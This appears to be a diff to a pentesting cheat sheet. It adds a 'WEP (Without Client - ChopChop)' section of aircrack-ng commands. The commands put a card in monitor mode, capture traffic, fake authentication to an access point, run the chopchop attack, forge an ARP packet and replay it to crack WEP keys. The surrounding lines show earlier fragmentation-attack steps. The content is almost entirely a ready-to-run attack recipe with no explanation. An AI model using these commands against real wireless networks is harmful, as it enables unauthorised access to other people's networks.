@@ -32,3 +32,13 @@ aireplay-ng -5 -b <AP MAC> -h <Our MAC> <interface>
     packetforge-ng --null -s 42 -a <AP MAC> -h <Source MAC> -w <output filename> -y <PRGA filename>
 aireplay-ng -2 -r packet.cap mon0
 ```
+
+### WEP (Without Client - ChopChop)
+```
+airmon-ng start <interface> <AP channel>
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+aireplay-ng -4 -b <AP MAC> -h <Source MAC> <interface>
+packetforge-ng -0 -a $AP -h $MON -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-1110-163209.xor -w arp.pcap
+aireplay-ng -2 -r arp.pcap mon0
+```
